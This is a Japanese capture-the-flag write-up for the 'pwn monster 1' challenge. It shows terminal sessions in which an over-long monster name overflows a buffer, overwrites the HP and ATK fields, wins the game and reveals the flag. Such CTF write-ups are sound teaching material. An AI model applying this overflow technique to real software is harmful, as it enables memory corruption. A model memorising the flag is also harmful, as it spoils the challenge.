# pwn monster 1:Pwn:200pts
pwn monsterが完成しました！ライバルのpwnchuは最強で、バグ技を使わない限りは勝てないでしょう。  
`nc 35.200.120.35 9001`  
[pwn_monster_1.zip](pwn_monster_1.zip)  

# Solution
言われた通りにncしてみるとゲームが始まった。  
```bash
$ nc 35.200.120.35 9001
 ____                 __  __                 _
|  _ \__      ___ __ |  \/  | ___  _ __  ___| |_ ___ _ __
| |_) \ \ /\ / / '_ \| |\/| |/ _ \| '_ \/ __| __/ _ \ '__|
|  __/ \ V  V /| | | | |  | | (_) | | | \__ \ ||  __/ |
|_|     \_/\_/ |_| |_|_|  |_|\___/|_| |_|___/\__\___|_|
                        Press Any Key


Welcome to Pwn Monster World!

I'll give your first monster!

Let's give your monster a name!
+--------+--------------------+----------------------+
|name    | 0x0000000000000000 |                      |
|        | 0x0000000000000000 |                      |
|HP      | 0x0000000000000064 |                  100 |
|ATK     | 0x000000000000000a |                   10 |
+--------+--------------------+----------------------+
Input name: Satoki
+--------+--------------------+----------------------+
|name    | 0x0000696b6f746153 |               Satoki |
|        | 0x0000000000000000 |                      |
|HP      | 0x0000000000000064 |                  100 |
|ATK     | 0x000000000000000a |                   10 |
+--------+--------------------+----------------------+
OK, Nice name.

Let's battle with Rival! If you win, give you FLAG.

[You] Satoki HP: 100
[Rival] pwnchu HP: 9999
Your Turn.

Rival monster took 10 damage!


[You] Satoki HP: 100
[Rival] pwnchu HP: 9989
Rival Turn.

Your monster took 9999 damage!


[You] Satoki HP: -9899
[Rival] pwnchu HP: 9989
Lose...

```
相手が強すぎるが、先制攻撃タイプなのでBOFでATKを書き換えればよいとわかる。  
```bash
$ nc 35.200.120.35 9001
 ____                 __  __                 _
|  _ \__      ___ __ |  \/  | ___  _ __  ___| |_ ___ _ __
| |_) \ \ /\ / / '_ \| |\/| |/ _ \| '_ \/ __| __/ _ \ '__|
|  __/ \ V  V /| | | | |  | | (_) | | | \__ \ ||  __/ |
|_|     \_/\_/ |_| |_|_|  |_|\___/|_| |_|___/\__\___|_|
                        Press Any Key


Welcome to Pwn Monster World!

I'll give your first monster!

Let's give your monster a name!
+--------+--------------------+----------------------+
|name    | 0x0000000000000000 |                      |
|        | 0x0000000000000000 |                      |
|HP      | 0x0000000000000064 |                  100 |
|ATK     | 0x000000000000000a |                   10 |
+--------+--------------------+----------------------+
Input name: SatokiSatokiSatokiSatokiSatoki
+--------+--------------------+----------------------+
|name    | 0x6153696b6f746153 |             SatokiSa |
|        | 0x6f746153696b6f74 |             tokiSato |
|HP      | 0x696b6f746153696b |  7596287742130219371 |
|ATK     | 0x0000696b6f746153 |      115910152315219 |
+--------+--------------------+----------------------+
OK, Nice name.

Let's battle with Rival! If you win, give you FLAG.

[You] SatokiSatokiSatokiSatokiSatoki HP: 7596287742130219371
[Rival] pwnchu HP: 9999
Your Turn.

Rival monster took 115910152315219 damage!


[You] SatokiSatokiSatokiSatokiSatoki HP: 7596287742130219371
[Rival] pwnchu HP: -115910152305220
Win!

nitic_ctf{We1c0me_t0_pwn_w0r1d!}

```
名前をたくさん入力して勝利した。  

## nitic_ctf{We1c0me_t0_pwn_w0r1d!}